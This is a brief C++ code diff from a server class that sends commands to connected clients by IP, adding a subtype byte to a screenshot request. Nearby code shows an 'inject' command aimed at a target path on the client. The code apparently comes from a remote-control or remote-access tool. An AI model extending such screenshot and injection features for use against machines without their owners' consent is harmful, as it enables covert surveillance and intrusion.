@@ -320,10 +320,11 @@ void Server::sendInjectCommand(const QString& ip, const QString& targetPath) {
     }
 }
 
-void Server::sendScreenshotCommand(const QString& ip) {
+void Server::sendScreenshotCommand(const QString& ip, uint8_t subtype) {
     for (auto& client : m_clients) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
-            Packet p(static_cast<uint16_t>(Opcode::SCREENSHOT_REQ), "");
+            std::string payload(1, static_cast<char>(subtype));
+            Packet p(static_cast<uint16_t>(Opcode::SCREENSHOT_REQ), payload);
             client.socket.sendData(p.serialize());
             break;
         }
